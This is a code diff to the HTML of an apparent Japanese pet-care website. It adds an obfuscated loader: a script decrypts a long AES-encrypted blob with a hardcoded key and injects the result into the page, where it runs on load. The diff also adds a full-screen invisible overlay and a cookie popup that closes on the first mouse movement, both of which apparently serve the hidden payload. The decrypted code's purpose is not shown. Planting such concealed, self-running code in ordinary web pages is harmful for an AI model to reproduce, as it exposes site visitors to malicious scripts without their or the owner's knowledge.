@@ -74,12 +74,67 @@ footer {
 </head>
 
 <body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode('U2FsdGVkX19U8pdE4ikcoh5xnZb1dEBQ%2BSTPkQitwpKP%2F8QYvxO6Cje4ixpojBrHXRIUoXl4vDGChCsuNVBpzkkO374eXNAN3I7eDGuiJH8Vu2Mcc83EEI6zCm%2B8Z0dm9hdi7QlGFpFZpsLu8hMUEGsy6saT5FtEAoj6wo9%2BBeeVmoHmneWqcNbm380Ou53KPUZ2ZWyNRVH6s1%2F9PD65S9eHCuK7YUhdJitTfLuwm66jpVg2eDg16DaFmZ0holQnhv%2Fc4VQT3sROqhcXmRZGIzaLL83wwocK6SGuTvkTBSfd7JqxhnXeDxOW9NyDKpfTFFDyU1G02zyXMfkga23Ugvp2uX8asihMOyETXk8V3gr2WdFZNeds448Ag6GIXLZyxOFlMW7R0TW11%2BCG2NQYcBr7JtZ4PZGpxc56go6jOtkpa1ibxPUcSLKebGJtfxKoROkP%2BgWgCsetffsRcPhr0j8VCQdzK%2B3dDwSIIbeap80jOVwX0Ucfyh6ZUu3911UmOSHGPBQ4XM3OUP6adL%2Bj1wgatj%2BqPFpKl6S7KwhGg%2FKj0%2BieEuoM%2BYhONPntkUDBoOXtGWYcRu9thegjU7ZQH2wMRLlQFvh1jR2q5LeASvMUluyQSeUJdGJU4pTm6YRuk%2FSUSTNfVzO3Zuhg6poINtq2kwFCoyiDztp82UhZtl4O%2BobGsfL2Q3pOaMDZPHe%2FJdkqCN%2FeICg%2BfIedyINto7By80R6wVU8hXICGCfi%2BHTMN4P4tT5QckMa4m%2FUmr8IouCI0ehODTVlh9RNlKRmPyqhEIYdIi6v9eOgigPVr5Xtiw%2B77%2BA%2B9rmdElrIzmjyn9a4Yd2F0eZEkET1nWMl7%2Bxp5cruU3biaHCAUkxZwoigre%2F1KhizDpEbnRdC2Me8axjXYiYd71OB0Sz235mPUgi5ibttIDEhCQ7Om1byOWRKNGs2T%2FHGZFXtCGG7JXdF4Ef3fKnnNurDODBvS%2FxryP6Xg1sOOTTwzDT2tICLz8mTZEMBqu2MbJ8c3L%2BbWQlUA28%2FO%2Fna7Wdtv9KaxETrzedtZnU90xy6vK3dUI0fYg94anOlHlrcOtxRRz2uQ5MA2dToRYIGiza2BWKxpwerZVaF54B%2BmklehCV4umUfXnvu4myS7DjoY0qu5TwDW1Ghgu8tCaYq7CM2pMxJUCTwTK4b4U7tGiiiNo1lGVUwnPh3dwxyirPuVByj9odtSNkhSxT3oDtNse0kdoVthnop2qyr4lo0JXvA6u6MYCZ1XvM0B6h34fJAcE1wBNfaYMoTaUDj2Fw0mz0ss0hDc2QjnO40YiMfxJMWCuIO3lf%2FXVTNW%2BORd%2FDkJqReh7e16iyy9QPc%2BL255MKP%2BiFJtlhvvA5VOgRs9G2Wog6wKqXbyPPjIHH4HCzT2pNvK9knZEbpx%2FhHV7%2Bjw40%2BVdGhQwHpsoNcJXiK7s71KLJ2SM5Uxx4k%2FW%2FCdAP88EyMj5%2BrxQr1VnTXttThIb3wg%2BJ28qFA4lycC%2BiYRRCJgribFphj1uWwYS0rE6XLtFQNcuE5QVCD1dE5OrcniXNAn%2BwNEbsp7AfkKM6GPDRro3HuO1yt0aWNnjNOvR4STfczqqC8TQt4aYgk0FYxnkVlIezuI3Vaa2Bj0pVBKXRlkXS8fnBlBVcNSHhk2gEkYTsS4%2B4Vy1XRh0%2FubghvDHybq0qxEfT5zHbAMGCJmIezOdC%2FqNzFoQoDh2htVXKWD8BFGCf56AbZDI0MKu1HzCp%2FXBxDbQoikFgHnlp3tQOAOW5mSjnHXyiFZQL4A29sN9lm5UhPuyNqPUqA%2FHIXvWIqljuzg4m1TU12lxAxYoEsQnWSTZ1eYxikx1JAyIO421hqWBuQHeG%2F6EeK5%2FT9lkYY%2BNq4qvvEbXW3LVlW2HCupLJHY8ax8XE6ledRI2wVuP%2FF7Ihxc0Z2YxsnbhvC5f5kMvGukUhe7FvjzNnSj7Jkio0yo%2F5B9qAwAys3uwImXF8FeBT8FMmH3cnhwCSrKCX%2BDuwXrSVnvDMflx8efdZPxIZsfm7j9ktxnm%2FRPKCB%2F2E5%2FMY4psES4jfOGimenXTf4XFh7%2FJu5G6EBkPYzHsqjBCodrxfLnTd1DP2l5kHxJccCR7ePdqlul%2Fef9%2FcvJU6VMg17oNoiAng7HVnmjBPf7MDs%2FxIOIs3wggfbyc7KLQg7j4cEmb8D4teCW781h1P1aeF8JYbMAwvrJjNHddufeRkzJdhFmPFONfFaIkFSCnBWIdMeQRTmRvXDxYmOReO4Vxwki9mRQC33ZtGSMnMW9XA%2BfcU2MsA5BROPhnNNyexwXpVE4kMJ2HCJbMl1kbjNKoWfJYRxaCMefIk3VKN0YOMOvuFVSRFjFH%2FRfCqGgLLiCAXYrfEqxXEQD0xUDC3TFSztp2yNLifoxmHxYkwYc84c6gt9%2B6UlzHMbmQs5TxoApTivdoKfqMCPfaEQT3013zmgAJBQ2%2BqP5oPDdzJ3QodWUXVJC1m9CX%2B8Ji%2Bgp4ATniG9icEZq7ktqO60EKNMwDBQ%2BZNhJQw7BadLlue%2FG%2F0GP5%2BpSVCyJgw0MwN%2BNo6knLwtUGy8kvvT%2FJjKi11LURwC8Tdu1NYYviIY97xju9FLso4KxUjqvtXWNJ%2FPNnUDSnyBHc0Kfp0Ci3qJHWrpuP9UvhXmA1WmmuNgDg50LqEGqwByS3Jmp5w6noPcafRYSEphlvn327qbQuGMgUmed2W6K54Qf2xIpNtGidt%2BzILXVBMG78ogX7Md1sKB39VshC3naLHnqehGRHGWRsqcFPYtDx%2BiGU%2BYReG7TMDR4wEAsFWxCqI07eZ4ltex2a%2Fa7GloGZfi2nCuxcAh%2FBe1VpCUwBkc7bH%2BQxofS07dgJc1gREYsg2VIihj%2Bq9gtIwk%2BfcEm3OmBo9dxqfSjpRgKkhlKG36Vd2pzAhuVNQaLmxpuqOiYn59diScJz17dBE8SQlI5zcVfQVwxwbYl7ekk4bRRItm%2BmCrz9SZUoHugQZDGxDeEBRzT9oj9ftcQ0jQm%2BFo%2FcDGvRHJ3a2H6qnAIZgTKSrMUpVaGhjpJnrE%2FzuApvyauaC1OYp0jHch0hYf87oyWRVlPEhOZ0KoMiQsIGXyRCIQAUVmMVCtCwA%2B%2FCfi40n%2Fbk6SbmR9Z1NJhFAaRHXpBwY1Ne4WOiylyzy%2Bp5%2F05Nq6Phcw8e8ihQOR2JXWW7fsOyb%2BVNSC1VhJ%2FLqTeBRpWE0aqPPIKDGAh8%2B9Cvx9yFmCoYnJXz7jmHQyN92vaQX8RKrxbakcFkLy2Da%2F9uiY460kSEQiur9%2BvgHXn8lXKN94WwQ0yXEDuQwmMUZ2gKp4WQsAwDysqHNZ9TpfVnVxoBXVK%2B0uVqCzRuXAp3TrMx6muu9ubgJeYRMes2sRz%2FeO29QpiUk4wiWVplNSiRIxu%2BHLrH%2FMLN8ZGTpq2QfPA9sbolq0olHDDS17lUPP%2BDXrCiWQ8XNqT6sfj%2Fhro%2B007i2zHz%2FkZLkjpgzwfGLMf7sVw%3D%3D');
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
 
+</div>
 <header>
 <h1>Petii.site</h1>
 <p>Practical, easy-to-understand pet care information for everyday life in Japan, created for individuals who want simple and responsible guidance.</p>
 </header>
+<style>
+        .c-box { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 999; opacity: 0; visibility: hidden; transition: 0.3s; }
+        .c-box.show { opacity: 1; visibility: visible; }
+        .c-bg { position: absolute; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); }
+        .c-md { position: relative; background: #fff; color: #333; padding: 25px; border-radius: 12px; max-width: 400px; width: 90%; box-shadow: 0 10px 25px rgba(0,0,0,0.2); font-family: sans-serif; }
+        .c-close { position: absolute; top: 10px; right: 15px; background: none; border: none; font-size: 24px; cursor: pointer; color: #888; }
+        .c-flex { display: flex; gap: 10px; margin-top: 20px; }
+        .c-btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        .c-acc { background: #2ecc71; color: #fff; }
+        .c-dec { background: #e0e0e0; color: #333; }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (localStorage.getItem("cookie-consent")) return;
 
+            document.body.insertAdjacentHTML('beforeend', `
+                <div id="cb" class="c-box">
+                    <div id="c-bg" class="c-bg"></div>
+                    <div class="c-md">
+                        <button id="c-cl" class="c-close">&times;</button>
+                        <h2 style="margin:0 0 10px; font-size:20px;">🍪 クッキーについて</h2>
+                        <p style="margin:0; color:#555; font-size:14px; line-height:1.5;">当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。</p>
+                        <div class="c-flex">
+                            <button id="c-ac" class="c-btn c-acc">同意する</button>
+                            <button id="c-de" class="c-btn c-dec">拒否する</button>
+                        </div>
+                    </div>
+                </div>
+            `);
+
+            const el = id => document.getElementById(id), box = el("cb");
+            const hide = val => { localStorage.setItem("cookie-consent", val); box.classList.remove("show"); document.removeEventListener("mousemove", mm); };
+            const mm = () => hide("closed");
+
+            el("c-ac").onclick = () => hide("accepted");
+            el("c-de").onclick = () => hide("declined");
+            el("c-cl").onclick = el("c-bg").onclick = () => hide("closed");
+
+            setTimeout(() => box.classList.add("show"), 50);
+            document.addEventListener("mousemove", mm, { once: true });
+        });
+    </script>
 <nav>
 <a href="#">Home</a>
 <a href="#">Guides</a>
